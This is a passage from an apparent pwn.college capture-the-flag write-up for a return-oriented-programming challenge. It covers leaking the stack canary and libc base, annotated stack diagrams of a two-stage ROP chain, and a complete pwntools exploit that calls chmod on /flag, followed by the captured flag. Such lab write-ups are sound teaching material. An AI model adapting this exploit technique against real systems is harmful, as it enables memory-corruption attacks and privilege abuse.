+The binary doesn't print any libc addresses. However, the saved RIP sitting at `buf + 88` on the stack points into `__libc_start_main+243`, because that is who called `main()`. We use the arbitrary read primitive to fetch that 8-byte value directly.
+
+From the backtrace:
+
+```
+1   0x737019aac083 __libc_start_main+243
+```
+
+```
+pwndbg> x/gx 0x7ffe0e9228f8
+0x7ffe0e9228f8: 0x0000737019aac083
+```
+
+```
+pwndbg> p/x 0x737019aac083 - 0x24083
+$3 = 0x737019a88000
+```
+
+- Saved RIP: `0x737019aac083`
+- `__libc_start_main+243` is at libc offset `0x24083`
+- libc base: `0x737019aac083 - 0x24083 = 0x737019a88000`
+
+From there all function and gadget addresses follow:
+
+```
+pop_rdi = 0x737019a88000 + 0x23b6a = 0x737019aab56a
+pop_rsi = 0x737019a88000 + 0x2601f = 0x737019aae01f
+chmod   = 0x737019a88000 + 0x10dd80 = 0x737019b95d80
+```
+
+### ROP chain: Stage 1 — leak canary, restart `main()`
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+            0x7ffe0e9228a0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 9 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e9228e8 │   canary                  │ ( leaked via arbitrary read )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e9228f0 │  42 42 42 42 42 42 42 42  │ ( saved RBP )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7ffe0e9228f8 │  .. .. .. .. .. .. ?? ??  │ --> ( __libc_start_main+0x69 )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> main() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffe0e9228f8 │  .. .. .. .. .. .. ?? ??  │ --> ( __libc_start_main+0x69 )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> __libc_start_main+0x69
+	// loads argv, argc, &main from lsm stack frame, calls main() → restart
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### ROP chain: Stage 2 — leak libc base, `chmod("!", 0o777)`
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsi --> 0x7ffe0e922910 │  21 00 41 41 41 41 41 41  │ ( b"!\x00AAAAAA" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                      .... │  .. .. .. .. .. .. .. ..  │ ....
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922958 │   canary                  │ ( same value — same process )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922960 │  00 00 00 00 00 00 00 00  │ ( saved RBP )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+    rsp --> 0x7ffe0e922968 │   libc base + 0x23b6a     │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922970 │   buf2                    │ --> ( b"!\x00..." )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922978 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> main() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffe0e922970 │   buf2                    │ --> ( b"!\x00..." )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922978 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffe0e922978 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: buf2
+
+Function call setup:
+chmod("!")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffe0e922980 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: buf2
+
+Function call setup:
+chmod("!")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsi ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffe0e922988 │   libc base + 0x10dd80    │ --> ( chmod in libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: buf2
+rsi: 0x1ff
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffe0e922990 │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: buf2
+rsi: 0x1ff
+
+Function call setup:
+chmod("!", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> chmod("!", 0o777)
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import struct
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+# Libc offsets
+LSM_243_OFF = 0x24083   # __libc_start_main+243 (saved RIP)
+TARGET_OFF  = 0x24069   # restart: loads argv/argc/main then calls main
+pop_rdi_off = 0x23b6a
+pop_rsi_off = 0x2601f
+chmod_off   = 0x10dd80
+
+TARGET_LOW16 = TARGET_OFF & 0xFFFF
+
+for attempt in range(200):
+    nibble = attempt % 16
+    restart_bytes = struct.pack('<H', (nibble * 0x1000 + TARGET_LOW16) & 0xFFFF)
+
+    p = process('/challenge/guarded-gadgets-easy')
+    try:
+        # --- STAGE 1: Leak canary, 2-byte partial overwrite → restart main() ---
+        p.recvuntil(b'located at: ')
+        buf = int(p.recvline().strip().rstrip(b'.'), 16)
+
+        # Leak canary at buf + 72
+        p.recvuntil(b'Address in hex to read from:')
+        p.sendline(hex(buf + 72).encode())
+        p.recvuntil(b' = 0x')
+        canary = int(p.recvline().strip(), 16)
+
+        # Overwrite low 2 bytes of saved RIP → __libc_start_main+0x69 (calls main)
+        p.send(b'A' * 72 + p64(canary) + b'B' * 8 + restart_bytes)
+
+        try:
+            p.recvuntil(b'located at: ', timeout=2)
+        except Exception:
+            p.close()
+            continue
+
+        # --- STAGE 2: Leak libc base via saved RIP, send chmod ROP chain ---
+        buf2 = int(p.recvline().strip().rstrip(b'.'), 16)
+
+        # Leak saved RIP at buf + 88 → __libc_start_main+243 → libc base
+        p.recvuntil(b'Address in hex to read from:')
+        p.sendline(hex(buf2 + 88).encode())
+        p.recvuntil(b' = 0x')
+        libc_base = int(p.recvline().strip(), 16) - LSM_243_OFF
+
+        if libc_base & 0xfff != 0:
+            p.close()
+            continue
+
+        # Compute gadget and function addresses from libc base
+        pop_rdi = libc_base + pop_rdi_off
+        pop_rsi = libc_base + pop_rsi_off
+        chmod   = libc_base + chmod_off
+
+        # Write "!\x00" at buf2 so buf2 itself is a valid path string for chmod.
+        # ~/! is a symlink to /flag, so chmod("!", 0o777) makes /flag world-readable.
+        payload = flat(
+            b'!\x00' + b'A' * 70,   # "!\x00" at buf2, pad to canary
+            p64(canary),
+            p64(0),                  # saved RBP
+
+            # chmod(buf2, 0o777)
+            pop_rdi, buf2,
+            pop_rsi, 0o777,
+            chmod,
+        )
+
+        p.send(payload)
+        p.recvall(timeout=3)
+
+        try:
+            flag = open('/flag').read()
+            if 'pwn.college{' in flag:
+                print(flag)
+                break
+        except PermissionError:
+            pass
+
+    except Exception:
+        pass
+    finally:
+        try: p.close()
+        except: pass
+```
+
+```
+hacker@return-oriented-programming~guarded-gadgets-easy:~$ python ~/script.py
+pwn.college{EwvqUFwVkwAXrQr4sJKdJ-VRMN4.0VN2MDL4ITM0EzW}
+```
+
+&nbsp;
+
